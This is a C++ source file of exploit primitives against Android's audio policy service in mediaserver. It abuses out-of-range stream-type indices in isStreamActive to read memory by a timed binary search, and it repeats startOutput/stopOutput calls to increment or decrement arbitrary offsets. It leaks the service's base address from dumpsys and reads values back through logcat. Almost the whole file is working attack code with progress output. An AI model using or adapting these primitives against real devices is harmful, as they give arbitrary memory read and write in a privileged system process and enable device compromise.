#include "primitives.h"

namespace android {

uint32_t diff(uint32_t a, uint32_t b) {
	return (a > b) ? a-b : b-a;
}

int probable_read32(const sp<IAudioPolicyService>& service, int offset, uint32_t& value) {

	//Trying to figure out if the value at the first offset is a zero or not
	//(Since this will cause the subsequent tests to always return "true")
	if (service->isStreamActive((audio_stream_type_t)offset, 0) &&
		service->isStreamActive((audio_stream_type_t)offset, 0x7FFFFFFF) &&
		service->isStreamActive((audio_stream_type_t)offset, 0x80000000) &&
		service->isStreamActive((audio_stream_type_t)offset, 0xFFFFFFFF)) {
		return -EFAULT;
	}

	//Now that we know this value can be gaged, let's take a poke at it
	//The following code will do a regular binary search, but will try and calculate a
	//matching value for inPastMs in each iteration that will cause each comparison to
	//match the current iteration of the binary search.
	//Note that there may be very slight inaccuracies in the value returned because of
	//the delay between the time at which the request is initially processed, and the time
	//the remote timestamp is generated.
	nsecs_t startTime = systemTime();
	uint32_t high = (uint32_t)0xFFFFFFFF;
	uint32_t low = 0;
	while (diff(high, low) > 1) {
		uint32_t mid = (uint32_t)((high+low)/2);
		if (service->isStreamActive((audio_stream_type_t)offset, mid))
			low = mid;
		else
			high = mid;

	}
	printf("Deduced value before calculation: %08X\n", high);
	printf("startTime: %llu\n", startTime);
	uint64_t full_value = startTime - ((uint64_t)high)*1000000;
	value = (full_value >> 32) & 0xFFFFFFFF;
	printf("Full value: 0x%llX\n", full_value);
	return 0;
}

int is_non_zero(const sp<IAudioPolicyService>& service, int offset) {
	return  (service->isStreamActive((audio_stream_type_t)offset, 0) &&
		 service->isStreamActive((audio_stream_type_t)offset, 0x7FFFFFFF) &&
		 service->isStreamActive((audio_stream_type_t)offset, 0x80000000) &&
		 service->isStreamActive((audio_stream_type_t)offset, 0xFFFFFFFF));
}

void increment_by_one(const sp<IAudioPolicyService>& service, int offset) {
	service->startOutput(DEFAULT_OUTPUT, (audio_stream_type_t)offset, 0);
}

void decrement_by_one(const sp<IAudioPolicyService>& service, int offset) {
	service->stopOutput(DEFAULT_OUTPUT, (audio_stream_type_t)offset, 0);
}

void modify_value(const sp<IAudioPolicyService>& service, int offset, int difference) {

	//Choosing the needed modification method
	void(*modify_function)(const sp<IAudioPolicyService>& service, int offset);
	if (difference > 0)
    	modify_function = increment_by_one;
	else
    	modify_function = decrement_by_one;
	int magnitude = difference > 0 ? difference : -difference;

	printf("[+] Modifying offset %d by %d\n", offset, difference);
	for (int i=0; i<magnitude; i++) {
	    //Checking if we need to increment or decrement
	    if ((i+1) % MODIFY_VALUE_PRINT_STEP == 0)
		    printf("[+] Modified %d/%d (%02f%%)\n", i, magnitude, (float)(i*100)/magnitude);
	    modify_function(service, offset);
	}
}

uint32_t get_audio_policy_manager_base_address() {

	FILE* dumpsys_output = popen("dumpsys media.audio_policy", "r");
	uint32_t address = 0;
	char* buffer = (char*)malloc(4096);
	size_t len = 4096;
	int read;
	while ((read = getline(&buffer, &len, dumpsys_output)) != -1) {
		int res = sscanf(buffer, "AudioPolicyManager Dump: 0x%08x", &address);
		if (res > 0) {
//			printf("[+] Found APMB address\n");
			break;
		}
	}
	free(buffer);
	fclose(dumpsys_output);
	return address;
}

pid_t get_mediaserver_pid() {

    FILE* ps_output = popen("ps", "r");
    pid_t pid = 0;
	char* buffer = (char*)malloc(4096);
	size_t len = 4096;
	int read;
	while ((read = getline(&buffer, &len, ps_output)) != -1) {
		if (strstr(buffer, "/system/bin/mediaserver") == NULL)
            continue;
        int res = sscanf(buffer, "media      %d", &pid);
		if (res > 0) {
			break;
		}
	}
	free(buffer);
	fclose(ps_output);
	return pid;


}

int read_negative_value_at(const sp<IAudioPolicyService>& service, int offset) {

	//Clearing the log file and causing a decrement
	system("logcat -c");
	decrement_by_one(service, offset);

	//Reading until we find a matching line
	FILE* log_file = fopen("/dev/log/main", "r");
	int delta, stream, refCount;
	int read;
	char* buffer = (char*)malloc(4096);
	size_t len = 4096;
	while ((read = getdelim(&buffer, &len, '\0', log_file)) != -1) {
		int res = sscanf(buffer, "changeRefCount() invalid delta %d for stream %d, refCount %d", &delta, &stream, &refCount);
		if (res > 0) {
			printf("[+] delta: %d, stream: %d, refCount: %d\n", delta, stream, refCount);
			break;
		}

	}
	free(buffer);
	fclose(log_file);
	return refCount;
}

}
